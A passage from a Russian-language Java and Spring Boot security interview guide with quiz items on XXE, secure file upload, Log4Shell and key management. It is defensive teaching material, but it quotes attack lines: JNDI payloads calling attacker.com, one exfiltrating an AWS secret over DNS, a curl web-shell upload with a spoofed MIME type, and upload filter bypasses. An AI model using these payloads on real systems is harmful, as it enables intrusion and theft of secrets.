<user><name>&xxe;</name></user>
```

### Уязвимый код

```java
// УЯЗВИМО: SAXParser без отключения внешних сущностей
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(inputStream); // читает /etc/passwd!
```

### Безопасная конфигурация парсера

```java
// Безопасный DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// Отключаем DOCTYPE полностью (рекомендуется)
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// Или точечно — только внешние сущности
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

DocumentBuilder db = dbf.newDocumentBuilder();
```

### Jackson XML (Spring Boot)

```java
// Безопасная конфигурация JacksonXmlModule
@Bean
public XmlMapper xmlMapper() {
    XmlMapper mapper = new XmlMapper();
    // Jackson 2.x по умолчанию отключает XXE — убедитесь в версии
    mapper.configure(MapperFeature.DEFAULT_VIEW_INCLUSION, false);
    return mapper;
}
```

**Правило**: всегда явно отключайте `DOCTYPE` в XML-парсерах. В современных Spring Boot приложениях предпочтительнее использовать JSON; если XML обязателен — явно конфигурируйте парсер.

> [!mcq]
> - [x] XXE (CWE-611) предотвращается через отключение DOCTYPE: dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true) + отключение external entities; позволяет чтение локальных файлов, SSRF, в редких случаях — RCE; в JSON/Protobuf атака невозможна. | Верная защита. disallow-doctype-decl полностью блокирует DOCTYPE в XML. Альтернатива — точечное отключение external-general-entities, external-parameter-entities, load-external-dtd. В современных приложениях лучший подход — использовать JSON вместо XML.
> - [ ] XXE предотвращается использованием Jackson для парсинга XML: Jackson 2.x по умолчанию уязвим к XXE, но современные версии (3.x) полностью защищены автоматически. | Jackson 2.x для XML по умолчанию отключает XXE (начиная с определённой версии), но не автоматически для всех конфигураций. Ключевой принцип — всегда явно конфигурировать XML-парсер с disallow-doctype-decl независимо от библиотеки. Jackson 3.x пока не релизнута.
> - [ ] XXE — это атака через JSON-парсер; защита — переход на YAML-парсер, который не поддерживает внешние сущности. | XXE (XML External Entity) касается XML-парсеров, а не JSON. JSON не поддерживает внешние сущности в принципе (они — фича XML DOCTYPE). YAML имеет свои проблемы (YAML deserialization attacks), но не XXE. Путаница категорий.
> - [ ] XXE безопасно оставить включённым, если приложение не принимает пользовательский XML на внешнем API; внутренние XML-файлы (config, XSLT) не представляют риска. | Любой XML-парсер с включённым DOCTYPE уязвим. Atтакующий может подать XML через unexpected vectors: SOAP-запросы, загружаемые документы (DOCX содержит XML), OAuth-metadata, SVG-файлы. Правило: всегда отключать DOCTYPE во всех XML-парсерах приложения.

## Q43. (!) Как безопасно обрабатывать загрузку файлов в Spring Boot?

Загрузка файлов — одна из наиболее опасных операций: возможны path traversal, хранение исполняемых файлов, DoS через огромные файлы, XSS через SVG/HTML.

### Конфигурация лимитов

```yaml
# application.yml
spring:
  servlet:
    multipart:
      max-file-size: 10MB
      max-request-size: 12MB
      enabled: true
```

### Безопасный контроллер загрузки

```java
@RestController
@RequestMapping("/api/upload")
public class FileUploadController {

    private static final Set<String> ALLOWED_CONTENT_TYPES =
        Set.of("image/jpeg", "image/png", "application/pdf");
    private static final long MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB
    private final Path uploadDir = Paths.get("/var/uploads");

    @PostMapping
    public ResponseEntity<String> upload(@RequestParam("file") MultipartFile file)
            throws IOException {

        // 1. Проверка типа контента (не доверяем расширению)
        String contentType = file.getContentType();
        if (!ALLOWED_CONTENT_TYPES.contains(contentType)) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST,
                "Unsupported file type: " + contentType);
        }

        // 2. Проверка размера (дополнительно к конфигу)
        if (file.getSize() > MAX_FILE_SIZE) {
            throw new ResponseStatusException(HttpStatus.PAYLOAD_TOO_LARGE);
        }

        // 3. Генерируем безопасное имя через UUID
        String ext = switch (contentType) {
            case "image/jpeg" -> ".jpg";
            case "image/png" -> ".png";
            case "application/pdf" -> ".pdf";
            default -> throw new IllegalStateException();
        };
        String safeFilename = UUID.randomUUID() + ext;

        // 4. Сохраняем в безопасный путь (с проверкой)
        Path targetPath = uploadDir.resolve(safeFilename).normalize();
        if (!targetPath.startsWith(uploadDir)) {
            throw new ResponseStatusException(HttpStatus.BAD_REQUEST);
        }

        // 5. Проверка magic bytes (сигнатуры файла)
        validateMagicBytes(file.getBytes(), contentType);

        Files.copy(file.getInputStream(), targetPath,
            StandardCopyOption.REPLACE_EXISTING);

        return ResponseEntity.ok(safeFilename);
    }

    private void validateMagicBytes(byte[] bytes, String contentType) {
        if ("image/jpeg".equals(contentType)) {
            // JPEG начинается с FF D8 FF
            if (bytes.length < 3 || bytes[0] != (byte) 0xFF ||
                bytes[1] != (byte) 0xD8 || bytes[2] != (byte) 0xFF) {
                throw new ResponseStatusException(HttpStatus.BAD_REQUEST,
                    "Invalid JPEG signature");
            }
        }
        // Аналогично для PNG: 89 50 4E 47, PDF: 25 50 44 46
    }
}
```

### Дополнительные меры

- **Антивирусное сканирование**: ClamAV интеграция через `Java API`
- **Изолированная подсеть**: файловое хранилище в отдельном сегменте сети
- **CDN/Object Storage**: `S3`, `MinIO` — файлы не на app-сервере
- **Запрет исполнения**: `noexec` флаг на `/var/uploads`

> [!mcq]
> - [ ] Безопасная загрузка достигается только `spring.servlet.multipart.max-file-size`; типы и magic bytes избыточны. | max-file-size защищает от DoS, не от path traversal/RCE/XSS через SVG. ❌ ПОСЛЕДСТВИЕ: загрузка `shell.jsp` под видом `image/jpeg` в Tomcat-deployed app → RCE через `GET /uploads/shell.jsp?cmd=id` (классическая атака на legacy Java apps).
> - [x] Безопасная загрузка: whitelist Content-Type + magic bytes (JPEG: `FF D8 FF`, PNG: `89 50 4E 47`), UUID-имена, `startsWith(uploadDir)`, антивирус ClamAV, S3/MinIO storage, `noexec` на каталоге, лимиты размера. | ✓ ПРИМЕНЯТЬ: Slack uploads — все файлы в S3 с presigned URL + ClamAV scan; Discord использует Cloudflare R2 + magic-bytes validation. 📋 ПРАВИЛО: «MIME + magic bytes + UUID + S3». 🔗 См. Q13, Q41, Q42.
> - [ ] Content-Type header из multipart можно доверять — браузер не позволяет подменять MIME. | Атакующий шлёт `curl -F file=@shell.jsp;type=image/jpeg`. Подмена тривиальна. ❌ ПОСЛЕДСТВИЕ: команда верит Content-Type, принимает `.jsp` под `image/jpeg` → исполняемый файл в `/uploads/`, RCE через прямой вызов Tomcat handler.
> - [ ] Хранение на app-сервере + Nginx с фильтрацией расширений безопасно; CDN/S3 избыточны. | Nginx-фильтр обходится через `..%00.jsp`, `.jSp` (case), `.war` (если deploy-папка). DoS через disk-space, нет presigned-URL с TTL. ❌ ПОСЛЕДСТВИЕ: `shell.php.jpg` в Apache + `mod_mime` magic — выполняется как PHP; RCE и установка криптомайнеров на app-серверах.

## Q44. Как работает Log4Shell и почему это критично?

**Log4Shell** (CVE-2021-44228) — критическая уязвимость в `Apache Log4j 2.x` (CVSS 10.0), позволявшая достичь RCE через JNDI lookup в любом логируемом значении.

### Механизм атаки

```
1. Злоумышленник отправляет HTTP-запрос с заголовком:
   User-Agent: ${jndi:ldap://attacker.com/exploit}

2. Приложение логирует заголовок: log.info("Request from {}", userAgent)

3. Log4j 2.x обрабатывает ${jndi:...} — делает LDAP lookup

4. LDAP-сервер злоумышленника возвращает ссылку на вредоносный Java-класс

5. JVM загружает и выполняет вредоносный код → RCE
```

### Почему это важно понимать

```java
// УЯЗВИМО (Log4j 2.0-2.14.1)
import org.apache.logging.log4j.LogManager;
Logger log = LogManager.getLogger();
log.info("User-Agent: {}", request.getHeader("User-Agent")); // RCE!

// БЕЗОПАСНО: Log4j 2.15.0+ отключает JNDI lookup по умолчанию
// БЕЗОПАСНО: Logback (SLF4J) не имел этой уязвимости
// БЕЗОПАСНО: Java util logging (JUL) не имел этой уязвимости
```

### Уроки для разработчика

1. **Мониторинг уязвимостей зависимостей** — SBOM + SCA tools (`OWASP Dependency-Check`, `Snyk`)
2. **Быстрая реакция** — процедура экстренного обновления зависимостей
3. **Принцип минимальных привилегий** — даже при RCE ограниченный пользователь снижает ущерб
4. **Egress filtering** — блокировка исходящих соединений с app-сервера снижает риск

```xml
<!-- pom.xml: всегда актуальная версия Log4j -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.24.3</version> <!-- минимум 2.17.1 для fix Log4Shell -->
</dependency>
```

> [!mcq]
> - [x] Log4Shell (`CVE-2021-44228`, CVSS 10.0) — RCE через JNDI-lookup в Apache `Log4j 2.x`: любое логируемое значение с `${jndi:ldap://attacker.com/x}` вызывает LDAP-lookup и загрузку Java-класса; fix — Log4j 2.17.1+ с отключённым JNDI. | Уязвимы 2.0–2.14.1. Logback и `java.util.logging` НЕ затронуты. ✓ ПРИМЕНЯТЬ: после Log4Shell `Log4j` config `log4j2.formatMsgNoLookups=true` стал стандартом; AWS, Cloudflare, Apple патчили миллионы систем за дни. 📋 ПРАВИЛО: «Любое логируемое поле — потенциальный JNDI-вектор». 🔗 См. Q21, Q27, Q28.
> - [ ] Log4Shell — уязвимость SLF4J/Logback; Apache Log4j не затронут. | Обратное: уязвим именно `Log4j 2.x`, Logback/JUL — нет. ❌ ПОСЛЕДСТВИЕ: команда мигрирует с Logback на Log4j «для производительности» в декабре 2021, попадает прямо в `CVE-2021-44228`; production открыт для RCE через `User-Agent` header.
> - [ ] Log4Shell эксплуатируется только при удалённой загрузке Log4j через Maven (supply-chain); локальная библиотека безопасна. | Атака в runtime через логирование недоверенного ввода. ❌ ПОСЛЕДСТВИЕ: команда «Maven Central не используем, тащим JAR-ы локально», но локальный `log4j-core-2.14.0.jar` так же уязвим — `User-Agent: ${jndi:ldap://evil/x}` → RCE независимо от способа доставки.
> - [ ] Log4Shell предотвращается egress firewall на LDAP/RMI; апдейт Log4j избыточен. | Egress снижает риск, не устраняет: (1) `file://`-handler, (2) JNDI запускает loading класса до сетевого запроса, (3) internal LDAP в той же сети. ❌ ПОСЛЕДСТВИЕ: команда блокирует LDAP egress, но забывает RMI и DNS-exfil; attacker через `${jndi:dns://attacker.com/$env:AWS_SECRET_KEY}` сливает секреты по DNS-запросам.

## Q45. Как реализовать безопасную работу с Cryptographic Keys в Java?

Неправильное управление ключами — одна из самых частых криптографических ошибок (OWASP A02).

### Антипаттерны

```java
// ПЛОХО: ключ в исходном коде
private static final String SECRET_KEY = "my-secret-key-123";

// ПЛОХО: ключ в environment variable (виден в ps aux, docker inspect)
String key = System.getenv("ENCRYPTION_KEY");

// ПЛОХО: слабый ключ
SecretKey key = new SecretKeySpec("password".getBytes(), "AES"); // 8 байт < 128 бит
```

### Правильная работа с ключами

```java
// 1. Генерация криптографически стойкого ключа
KeyGenerator keyGen = KeyGenerator.getInstance("AES");
keyGen.init(256, new SecureRandom()); // 256-битный ключ
SecretKey secretKey = keyGen.generateKey();

// 2. Хранение в Java KeyStore
KeyStore ks = KeyStore.getInstance("PKCS12");
ks.load(null, null); // создать новый
ks.setKeyEntry("mykey", secretKey, "keyPassword".toCharArray(),
    new Certificate[0]);
// Сохранение в файл (защищённый паролем)
try (var fos = new FileOutputStream("keystore.p12")) {
    ks.store(fos, "storePassword".toCharArray());
}

// 3. Загрузка из KeyStore
KeyStore ks = KeyStore.getInstance("PKCS12");
try (var fis = new FileInputStream("keystore.p12")) {
    ks.load(fis, "storePassword".toCharArray());
}
SecretKey key = (SecretKey) ks.getKey("mykey", "keyPassword".toCharArray());
```

### HashiCorp Vault интеграция в Spring Boot

```yaml
# application.yml
spring:
  cloud:
    vault:
      host: vault.example.com
      port: 8200
      scheme: https
      authentication: KUBERNETES # или TOKEN, AWS_EC2
      kubernetes:
        role: my-app
      kv:
        enabled: true
        backend: secret
        default-context: my-app
```

```java
// Использование секретов из Vault
@Value("${encryption.key}")
private String encryptionKey; // автоматически подтягивается из Vault

// Или через VaultTemplate для динамических секретов
@Autowired
private VaultTemplate vaultTemplate;

public String getDbPassword() {
    VaultResponse response = vaultTemplate.read("database/creds/my-role");
    return (String) response.getData().get("password");
}
```

### Принципы управления ключами

| Принцип | Реализация |
|---------|-----------|
| Separation of duties | Ключи отдельно от приложения |
| Key rotation | Регулярная ротация (Vault TTL, k8s Secret rotation) |
| Least privilege | Каждый сервис — свой ключ с минимальными правами |
| Audit trail | Логирование доступа к ключам |
| HSM для prod | Hardware Security Module для критичных ключей |

> [!mcq]
> - [ ] Ключи безопасно хранить как `private static final String SECRET_KEY = "my-key-123"`; JVM защищает private static от reflection. | Ключ в коде — критическая ошибка. `javap`/`strings`/декомпилятор видят значение; `setAccessible(true)` обходит private. ❌ ПОСЛЕДСТВИЕ: `Uber 2016` — AWS keys в GitHub-репозитории; атакующий скачал репу, получил доступ к 57M клиентских записей, скрытый инцидент → штраф $148M.
> - [x] Правильная работа с ключами: генерация через `KeyGenerator.init(256, SecureRandom)`; хранение в Java `KeyStore` (`PKCS12`) с password-защитой или в `HashiCorp Vault` через Spring Cloud Vault; rotation через TTL Vault; separation of duties; audit trail. | ✓ ПРИМЕНЯТЬ: Netflix `Lemur` для cert/key management; Spring Cloud Vault `kubernetes` auth для pod-bound секретов; AWS KMS envelope encryption для S3 client-side. 📋 ПРАВИЛО: «Vault/KMS + rotation + audit, не код и не env». 🔗 См. Q8, Q9, Q10.
> - [ ] Environment variables — оптимальный способ хранения ключей: изолированы от FS. | Env vars видны в `/proc/<pid>/environ`, `docker inspect`, `kubectl describe pod`, `ps auxe`; попадают в core dumps и error logs. ❌ ПОСЛЕДСТВИЕ: `kubectl describe pod` на dev-кластере показывает `DB_PASSWORD=...`; разработчик с view-доступом sees prod credentials → нет audit-trail кто и когда смотрел.
> - [ ] AES-128 достаточен для ВСЕХ сценариев; AES-256 избыточен. | AES-128 покрывает большинство, но AES-256 рекомендуется для долгоживущих данных и compliance (NIST SP 800-57). На AES-NI разница незаметна. ❌ ПОСЛЕДСТВИЕ: компания шифрует архивы 30+ лет (медицинские данные) на AES-128; через 15 лет post-quantum атаки делают AES-128 уязвимым, переплата за миграцию на AES-256.

---

## See also

- [Безопасность приложений](application-security-interview.md) — общие принципы AppSec, Defense in Depth
- [Паттерны аутентификации и авторизации](authentication-authorization-patterns-interview.md) — RBAC, ABAC, Zero Trust
- [OAuth 2.0 и OpenID Connect](oauth2-interview.md) — авторизационные flows, JWT, токены
- [Spring Security](../frameworks/spring/spring-security-interview.md) — реализация безопасности в Spring
- [Микросервисы](../architecture/microservices-interview.md) — безопасность в распределённых системах, service mesh
- [Распределённые системы](../architecture/distributed-systems-interview.md) — безопасность на уровне инфраструктуры
- [Kubernetes](../devops/kubernetes-interview.md) — Pod Security, Network Policy, Secrets
- [HTTP и REST](../api/http-rest-interview.md) — security headers, CORS, TLS

- [Application Security](application-security-interview.md)
- [Authentication and Authorization Patterns](authentication-authorization-patterns-interview.md)
- [JWT](jwt-interview.md)
- [mTLS (Mutual TLS)](mtls-interview.md)
- [OAuth2](oauth2-interview.md)
- [Secrets Management](secrets-management-interview.md)
